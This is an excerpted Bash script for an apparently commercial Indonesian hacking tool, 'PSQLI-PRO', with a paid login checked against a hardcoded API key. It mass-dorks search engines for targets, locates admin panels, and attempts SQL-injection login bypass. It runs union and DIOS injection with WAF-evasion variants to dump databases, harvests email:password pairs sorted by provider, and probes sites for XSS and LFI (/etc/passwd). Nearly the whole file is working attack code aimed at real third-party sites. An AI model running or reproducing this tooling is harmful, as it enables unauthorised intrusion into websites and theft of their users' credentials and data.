...
# ==================== SISTEM LOGIN ====================
BINID="6a0d8364ee5a733b12ec8e6f"
APIKEYBIN='$2a$10$oWlz5B1FVUm9NMBH0nOLeu51eosHAJuyted1h8Psj8ZhSdsoYtVYC'
...
# File untuk menyimpan session login
SESSION_FILE="$HOME/.psqli_session"
MAX_RETRY=3
TIMEOUT_LOGIN=30
...
ambil_data_user() {
    ...
    while [ $retry -lt $MAX_RETRY ]; do
        response=$(curl -s --max-time $TIMEOUT_LOGIN -H "X-Master-Key: ${APIKEYBIN}" "$url" 2>/dev/null)
        
        if [ $? -eq 0 ] && [ -n "$response" ]; then
            users=$(echo "$response" | grep -o '"users":\[.*\]' | sed 's/"users"://g' | sed 's/\[//g' | sed 's/\]//g')
            if [ -n "$users" ]; then
                echo "$users"
                return 0
            fi
        ...
        retry=$((retry + 1))
        echo -e "${LR}[!] Koneksi error (percobaan ${retry}/${MAX_RETRY})${LW}" >&2
        [ $retry -lt $MAX_RETRY ] && sleep 2
    done
    
    echo -e "${LR}[!] Gagal mengambil data setelah ${MAX_RETRY} percobaan. Cek koneksi!${LW}" >&2
    return 1
}
...
login() {
    ...
    cat << "EOF"
                                    ...
                                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣤⣭⣍⣉⣛⣋⣭⣥⣾⣿⣿ 
                                            PSQLI-PRO LOGIN
                                       buy akun di t.me/cpl_denz
    
EOF
    echo -e "${LW}"
    
    # Cek session tersimpan
    if [ -f "$SESSION_FILE" ] && [ $(($(date +%s) - $(stat -c %Y "$SESSION_FILE" 2>/dev/null || echo 0))) -lt 3600 ]; then
        local saved_user=$(cat "$SESSION_FILE" 2>/dev/null)
        if [ -n "$saved_user" ]; then
            echo -e "${LG}[+] Session ditemukan, selamat datang kembali ${saved_user}${LW}"
            sleep 1
            return 0
        fi
    fi
    
    users_data=$(ambil_data_user)
    if [ $? -ne 0 ] || [ -z "$users_data" ]; then
        echo -e "${LR}[!] Gagal load data user${LW}"
        echo -e "${LY}[?] Lanjut tanpa login? (y/n): ${LW}"
        read -r lanjut
        if [[ "$lanjut" =~ ^[Yy]$ ]]; then
            return 0
        else
    ...
    while true; do
        echo -ne "${LY}Username: ${LW}"
        read -r username
        
        user_found=$(echo "$users_data" | grep -o "\"username\":\"${username}\"" | head -1)
        
        if [ -z "$user_found" ]; then
            echo -e "${LR}[!] Username Tidak Ditemukan${LW}"
            echo -e "${LY}[?] Coba lagi? (y/n): ${LW}"
            read -r retry_login
            [[ ! "$retry_login" =~ ^[Yy]$ ]] && exit 1
            continue
        fi
        
        echo -ne "${LY}Password: ${LW}"
        read -rs password
        echo ""
        
        user_entry=$(echo "$users_data" | grep -o "\"username\":\"${username}\",\"password\":\"[^\"]*\"" | head -1)
        user_pass=$(echo "$user_entry" | grep -o "\"password\":\"[^\"]*\"" | cut -d'"' -f4)
        
        if [ "$password" != "$user_pass" ]; then
            echo -e "${LR}[!] Password Tidak Cocok, Periksa Lagi${LW}"
            echo -e "${LY}[?] Coba lagi? (y/n): ${LW}"
            read -r retry_login
            [[ ! "$retry_login" =~ ^[Yy]$ ]] && exit 1
            continue
        ...
        echo -e "${LG}[+] Password Valid, Selamat Datang ${username}${LW}\n"
...
dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
...
# Dork wordlist
admin_dork="admin/ admin.php login/ login.php"
dork_login="login"
xss_payload="%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e"
lfi_count="5"
...
for pkg in "${dependencies[@]}"; do    
    command -v $pkg >/dev/null 2>&1 || { 
        echo -e >&2 "${O}$pkg ${N}: belum terinstall - akan menginstallnya" 
...
▒${N}█▐${R}▒▒▒${N}████████████${R}▒▒▒▒       ${P}  d3nz${R}
▒${N}▌▐${R}▒▒${N}██▄▀██████▀▄██${R}▒▒▒  ${N} ⊱⋅ ──────────── ⋅⊰⊱${N}⋅
${N}▐┼▐${R}▒▒${N}██▄▄▄▄██▄▄▄▄██${R}▒▒▒   ${BL}Author: ${BR}d3nz-ploit${N} 
...
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ${G}root@d3nz# ${N}"
    ...
    if [ "$menu" = "1" ]; then
        ...
        if [[ "$page" = "" ]]; then
            ...
            for hitung in $(seq 1 $page); do
                echo -e "${G}get dork from google"
                dork=$(echo "deface+$pocna")
                dorking
            done
            trap - INT
            for site in $(cat .result_dork | sort -u); do
...
bysqli() {
    ...
    adminfin() {
        ...
        pa="1"
        trap break INT
        for dork in $dork_login+inurl:$site; do
            echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..." | tr "+" " "
            rm -rf .result_dork .not
            for COUNT in $(seq 1 $pa); do
                echo -e "${G}Result from bing page $COUNT${N}"
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
                cat .result_dork 2>/dev/null | while read ress; do
                    echo -e "Result => ${O}$ress${N}"
        ...
        trap break 2 INT
        if cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir" >/dev/null; then
            for site3 in $(cat .result_dork 2>/dev/null | sort -u | uniq -i | sed 's/\r$//' | tr -d "\0" | grep -a "$dir"); do
                ...
                if echo "$ngecurl" | grep -Po "200 OK" >/dev/null; then
                    if echo "$ngecurl" | grep -aP "password|Password|Username|login|username|Log in|Login|sign in|Sign in" >/dev/null; then
                        if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null; then
        ...
        echo -e "${BL}gunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
        trap break 3 INT
        for admin in $(cat $panel_admin | sed 's/\r$//' | tr -d "\0"); do
            ...
            if echo "$ngecurl" | grep -Po "200 OK" >/dev/null; then
                if echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in" >/dev/null; then
                    if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null; then
        ...
        if [[ -f .live ]]; then
            ...
            for F in `cat output/$dir/admin-login.txt 2>/dev/null | sort -u | uniq -i`; do
                echo -e "\x1b[0m${N}[${O}*${N}] ${G}FOUND ${N}:\033[2m $F"
            done
    ...
    dora() {
        ...
        for dork in $dork; do
            ...
            for COUNT in $(seq 1 $pa); do
                ...
                echo -e "${G}Result from yahoo page $COUNT${N}"
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "https://search.yahoo.com/search?ei=UTF-8&gprid=&fr2=sb-top&p=$dork&b=${COUNT}" -sL | grep -Po 'lh-24\" href="[^"]*"' | cut -d '"' -f3 | sed "/yahoo/d" >> .result_dork
                cat .result_dork 2>/dev/null | while read ress; do
                    echo -e "Result => ${O}$ress${N}"
                done
            done
        ...
        echo -e "${BL}gunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
        trap break 3 INT
        for site in $(cat .live 2>/dev/null); do
            echo -e "\n\x1b[0m${N}[${G}+${N}]${BL} Site: $site${N}"
            for admin in /home/ /home.php /Dashboard.php /Dashboard /index.php $(cat $list_direct 2>/dev/null); do
                if echo $site | awk -F "/" '{print $(NF)}' | grep "." >/dev/null; then
        ...
        if [[ -f .live ]]; then
            echo -e "${N}${BL}mengumpulkan login yang di temukan"
            for F in `cat .live 2>/dev/null | sort -u | uniq -i`; do
                echo -e "\x1b[0m${N}[${O}*${N}] ${G}FOUND ${N}:\033[2m $F"
            done
            echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result login found saved ${G}output/$dir/admin-login.txt${N}"
            echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"
    ...
    bypass() {
        ...
        while read xploit; do
            ...
            if echo $ng | grep -Po 'action="http[s]*://' >/dev/null; then
            ...
            if echo "$cek" | grep -Po "User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|coba|gagal|wrong|Wrong|Invalid|IncorectError|405|error" >/dev/null; then
        ...
        if [[ "$sukses" = "" ]]; then
            ...
            while read xploit; do
                ...
                if echo "$param1" | grep -Po "," >/dev/null; then
                    for para1 in `echo "$param1" | cut -d "," -f2`; do
                        param2="&$para1=$xploit"
                    done
                    param0=$(echo "$param1" | cut -d "," -f1)
                    postdata="$param0=$xploit$param2$value"
                    cek=$(curl -s -L -X POST "${post}" -d "${postdata}")
                    if echo "$cek" | grep -Po "User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|coba|gagal|wrong|Wrong|Invalid|Incorect|Try|try|Again|again|Error|405|error" >/dev/null; then
                        echo -e "${R}Gagal login dengan  : ${O}$xploit"
                        echo -e "${P}Post data: $post -d "$postdata"${N}\n"
                    else
                        sukses="\n+++++++++++++++++++++!!![ login sukses ]!!!+++++++++++++++++++++\nSite: $target \nLogin: $xploit"
...
[${O}6${N}]. logout"
        ...
        case $n in
            ...
            2) clear
               ...
               for target in $(cat $tar 2>/dev/null); do
                   bypass
               done
               read -p "kembali ke menu y/n? " tanya
               if [[ "$tanya" = "y" ]]; then
            ...
            3) clear
               ...
               case $d in
                   1) clear
                      ...
                      if [ -z $gagal ]; then
                          trap break 2 INT
                          for target in $(cat .live 2>/dev/null); do
                              bypass
                          done
                          trap - INT
                      fi
                    ...
                    2) clear
                      ...
                      for dork in $(cat $dor | sed "s| |+|g" 2>/dev/null); do
                          dora
                      done
                      if [ -z $gagal ]; then
                          trap break 2 INT
            ...
            4) clear
               ...
               case $d in
                   1) clear
                      ...
                      cat result_reverseip.txt | sort -u | uniq -i | while read site; do
                          adminfin
                      done
                      for target in $(cat .live 2>/dev/null); do
                          bypass
        ...
        while [ $ok = 0 ]; do
            ...
            if [ ${#table} -gt 1 ]; then
                while [ $ok = 0 ]; do
                    ...
                    if [ ${#co} -gt 1 ]; then
                        cor=$(echo $co | sed 's/,/|/g')
                        if cat .table | grep -Po "$table" >/dev/null; then
                            if cat .table | grep -Po "$cor" >/dev/null; then
...
error() {
    ...
    if echo -e "$cet" | grep -Po 'Not Acceptable|blocked|connection was reset|Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' > .waf; then
    ...
    if [ "$db" = "" ]; then
        ...
        if [[ "$rt" = "y" ]]; then
            ...
            if cat .db_er | grep -Po "$db_ro" >/dev/null; then
                echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
                db_na=$(cat .db_er | grep -Po "$db_root" | sort -u | uniq -i)
                if [[ -z $dbdir ]]; then
                    db_dir="null"
                ...
                if echo "$db_ro" | grep -Po "dios|DIOS|di|os|dio|DIO|dioS|Dio|Dios" >/dev/null; then
                    dump_sqli="n"
                    hex="database/**8**/()"
            ...
            for pot in $(seq 50); do
                ...
                if [ "$table" = "" ]; then
                    if cat .table 2>/dev/null >/dev/null; then
                        edump
                    else
                        echo -e "${O}Kosong\n${N}+$coi+"
...
hashdump() {
    ...
    trap break INT
    for op in y; do
        echo "$liste" | while read empass; do
            ...
            if echo "$pass" | grep -Po "</html>|<html>|</" >/dev/null; then
...
gen() {
    ...
    for keyword in $key; do
        for format in $mat; do
            for parameter in $(sort -R .key | head -$drk); do
                for sitein in $(sort -R .sites | head -$drk); do
...
fuzy() {
    ...
    url1=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$site" | grep -P -a -o 'href="[^"]*' | tr -d "#" | sed 's/href="//g' | sed 's/--//g' | tr -d '<>' | tr -d '!' | grep -v "^$" | cut -d ":" -f1 | sed 's/https//g' | sed 's/http//g' | grep -v "^$")
    rm -rf .url
    trap break INT
    for d in $(echo "$url1" | sort -u | uniq -i); do
        ...
        for link in $(echo "$ngurl" | sort -u | uniq -i); do
            printf "\b${sp:sc++:1}"
            ((sc==${#sp})) && sc=0
    ...
    if cat .url >/dev/null; then
        if [ $? -eq 0 ]; then
            ...
            if cat .url 2>/dev/null | grep -e ".jpg" -e ".png" -e ".ico" >/dev/null; then
                echo "[+] images url     : `cat .url | grep -e ".jpg" -e ".png" -e ".ico" | sort | uniq -i | wc -l`"
                if cat .url 2>/dev/null | grep -e ".css" -e ".js" >/dev/null; then
                    echo "[+] js url         : `cat .url | grep -e ".css" -e ".js" | sort | uniq -i | wc -l`"
                    if cat .url 2>/dev/null | grep -e ".php?id=" -e "?*=" | sort | uniq -i > output/$dir/$result_vuln; then
                        ...
                        masn="y"
                        trap break 2 INT
                        for site in $(cat output/$dir/$result_vuln 2>/dev/null | tr -d '\0' | sed 's/\r$//'); do
                            waff="n"
                            dump_name="n"
                            union="$union1"
...
dora() {
    ...
    for b in $(echo "$b"); do
        if echo -e "$b" | grep -Po '.php\?|=|.aspx\?|\?=' >/dev/null; then
            ...
            if cat .site | grep -Po "$sqli_error" | head -1 > .error; then
                sp="/-|"
...
# ==================== FUNGSI DORK SCAN LANJUTAN ====================
dorkscan() {
    true_lfi="n"
    dir=$(echo "$b" | sed 's!http[s]*://!!g' | cut -d '/' -f1)
    mkdir -p output/$dir
    for admin in `echo "$admin_dork" | tr -d '\0' | sed 's/\r$//'`; do
        ngecurl=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -s -L --max-time $time_out "$site/$admin" -D - | tr -d '\0' | sed 's/\r$//')
        if echo "$ngecurl" | grep -Po "200 OK" >/dev/null; then
            if echo "$ngecurl" | grep -aP "password|Password|Username|username|Log in|Login|sign in|Sign in" >/dev/null; then
                if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null; then
    ...
    if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -sL --max-time $time_out "$b$xss_payload" | grep -Po "kedjaw3n" | tr -d '\0' | sed 's/\r$//' >/dev/null; then
        echo -e "${N}[${O}*${N}] ${BL}XSS : $b$xss_payload${N}"
        echo -e "$b$xss_payload" >> output/$dir/xss.txt
    fi
    echo -en "\x1b[0m${N}[${O}!${N}] ${G}\033[2mscaning lfi..."
    b2=$(echo "$b" | cut -d "=" -f1)
    for hitung in $(seq $lfi_count); do
        spin
        ...
        if echo "$ngecurl" | grep -P "root:|daemon:|bin:|sys:" >/dev/null; then
            true_lfi="y"
            mkdir -p output/$dir
...
dump() {
    for aswlo in y; do
        ...
        if [[ "$boot_empas" = "y" ]]; then
            for table in $(cat .table | sort -u | uniq -i | grep -aP "$auto_get" | cut -d ":" -f1 | uniq -i); do
                ...
                trap break INT
                trap break SIGTRAP
                for ump in $Dump $Dump1 $Dump2 $Dump3 $Dump4 $Dump9 $Dump99 r; do
                    if echo "$dk" | grep -aP "database|Database" >/dev/null; then
                    ...
                    if echo "$cury" | grep "[[:alnum:]]" >/dev/null; then
                        ...
                        echo -en "${N}+$coi+\n"
                        if cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' >/dev/null; then
                            echo -e "${O}Dump Email Found Auto filter$N"
                            echo -e "Total Dumped :$G `wc -l output/$dir/dump-$table.txt`${N}"
                            for maile in gmail yahoo aol hotmail; do
                                ...
                                if cat .table | grep -Po "$table" >/dev/null; then
                                    if cat .table | grep -Po "$cor" >/dev/null; then
                                        ...
                                        for ump in $Dump $Dump1 $Dump2 $Dump3 $Dump4 $Dump9 $Dump99 r; do
                                            ...
                                            if echo "$cury" | grep "[[:alnum:]]" >/dev/null; then
                                                echo -e "$cury" >> output/$dir/dump-$table.txt
                                                if echo "$cury" | grep -ao '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' >/dev/null; then
                                                    echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na/$table${N}~\n"
                                                    echo -e "+$coi+\n $co \n+$coi+$O" | sed 's/,/ :: /g'
                                                    echo -e "$O$cury" | sort -u | uniq -i
                                                    echo -en "${N}+$coi+\n"
...
email() {
    ...
    echo "$line"
    curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$line" > tmp
    grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' "tmp" | sort | uniq -i > list
    echo ""
    echo "Total Dumped : `wc -l list`"
    for mail in gmail yahoo aol hotmail; do
        cat list | grep $mail >> $mail.txt
        echo "[+] `wc -l $mail.txt`"
    done
    cat list | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail >> others.txt
    echo "[+] others : `wc -l others.txt`"
    rm tmp
}
...
sqli() {
    ...
    if echo "$site" | awk -F "/" '{print $(NF)}' | cut -d "." -f2 | grep -Po "html" >/dev/null; then
    ...
    if [[ "$html" = "y" ]]; then
        ...
        if [[ "$m11" = "" ]]; then
            ...
            param1=$(echo "$site" | sed "s/$m21/'$m21/g")
            param11=$(echo "$param1" | cut -d "'" -f1)
            param21=$(echo "$param1" | cut -d "'" -f2)
        else
            param1=$(echo "$site" | sed "s/$m11/$m11'/g")
            param11=$(echo "$param1" | cut -d "'" -f1)
            param21=$(echo "$param1" | cut -d "'" -f2)
        fi
    ...
    if [[ "$bla" = "" ]]; then
        ...
        if [[ "$paksa" = "y" ]]; then
            ...
            if cat .tmp | grep "$order_by" >/dev/null; then
                ...
                inject
                if echo $i | grep "$order_by" >/dev/null; then
...
info() {
    ...
    if [[ "$dump_name" = "y" ]]; then
        ...
        for us in $Dump_db $ddbs $ddbs1 $ddbs2 $ddbs9 oi; do
            if [[ "$us" = "oi" ]]; then
                ...
                if cat .angka >/dev/null; then
                    if echo $ngecur | grep -Po "where clause" >/dev/null; then
                    ...
                    if [[ "$i" = `cat .angka | sort -r` ]]; then
                        ...
                        if cat .angka | wc -l | grep 3 >/dev/null; then
                ...
                if [[ "$ff" = "" ]]; then
                    ...
                    if [[ "$boot_empas" = "y" ]]; then
                        for db_ro in $(cat .db | sort -u | uniq -i); do
                            if [[ "$corect" = "y" ]]; then
                            ...
                            if echo "$db_ro" | grep -Po "dio|DIOS|dios|Dios|DIos|dios" >/dev/null; then
                            ...
                            if cat .db | grep -Po "$db_ro" >/dev/null; then
...
# ==================== FUNGSI DIOS (DUMP IN ONE SHOT) ====================
dios() {
    if cat .angka >/dev/null; then
        if echo $ngecur | grep -Po "Unknown column 'kedjaw3n[0-9]*'" >/dev/null; then
            df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')
            ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
            curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka
            cat .angka | sed 's/kedjaw3n//g' > .angka
        ...
        if [[ "$lcvs" = "y" ]]; then
            ...
            for dio in $dios1 $dios2 $dios3 $dios4 $dios5 $dios6 $dios8 $dios9 u; do
                if [[ "$dio" = "u" ]]; then
                ...
                if [[ "$based64" = "y" ]]; then
                    ...
                    if [[ "$debug" = "y" ]]; then
                        echo -e "DIOS : $in $i2 $dk $por \n$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
                    fi
                    echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                fi
                if [[ "$postd" = "y" ]]; then
            ...
            for dor in $asw1 $dios1 $dios2 $dios3 $dios4 $dios5 $dios6 $dios8 $dios9 y; do
                if [[ "$dor" = "y" ]]; then
                    lcvs="y"
...
inject() {
    ...
    trap break 4 INT
    for i in $(seq $order_start $order_by); do
        ...
        if [[ "$based64" = "y" ]]; then
            ...
            if echo "$site" | awk -F "/" '{print $(NF)}' | cut -d "." -f2 | grep -Po "html" >/dev/null; then
                ...
                if [[ "$m1" = "" ]]; then
                    ...
                    param=$(echo "$site" | sed "s/$m2/'$m2/g")
                    param1=$(echo "$param" | cut -d "'" -f1)
                    param2=$(echo "$param" | cut -d "'" -f2)
                else
                    param=$(echo "$site" | sed "s/$m1/$m1'/g")
                    param1=$(echo "$param" | cut -d "'" -f1)
                    param2=$(echo "$param" | cut -d "'" -f2)
                fi
        ...
        if [[ "$debug" = "y" ]]; then
            if [[ "$html" = "y" ]]; then
                echo "$param1$union$colom--+$param2"
                echo -e "$param1$union$colom--+$param2" | sed 's/0x6b65646a6177336e3//g'
            else
                echo "$ngecur" > sample
        ...
        if [ $? -eq 0 ]; then
            if echo -e "$ngecur" | grep -Po 'Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' >/dev/null; then
                waff="on"
                for by in $w1 $w2 $w3 $w4 $w5 $w6 $w7 $w8 $w9 $w10 $union1 $bof $basic_1 $whitespaces $urlencode $double_url $bof2 `cat union.txt 2>/dev/null`; do
                    if [[ "${by}" = "$w3" ]]; then
            ...
            if echo "$ngecur" | grep -Po "kedjaw3n3|kedjaw3n[0-9]*" > .angka; then
                if echo "$colom" | grep -Po "," >/dev/null; then
                    corona="n"
                else
                    corona="y"
                fi
                ...
                echo -e "$angka" | sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka
                if echo $mass | grep -Po "y" >/dev/null; then
                    break
                else
                    dump_name="y"
                    info
...
\033[2mpress Enter for exit${N}"
    ...
    case $d in
        ...
        2) masn="y"
           ...
           rm -rf .case1
           trap break INT
           for site in $(cat $tar 2>/dev/null | tr -d '\0' | sed 's/\r$//'); do
               waff="n"
               dump_name="n"
               union="$union1"
               if echo "$site" | grep -Po "&" >/dev/null; then
        ...
        6) clear
           ...
           case $d in
               ...
               2) clear
                  ...
                  trap break 2 INT
                  for site in `cat $file 2>/dev/null | tr -d '\0' | sed 's/\r$//'`; do
                      esql
                  done
                  trap - INT
                ;;
        ...
        19) logout
        ;;
        *) echo -e "${N}[${G}+${N}] Thx for using this tools"; exit 0 ;;
    esac
}
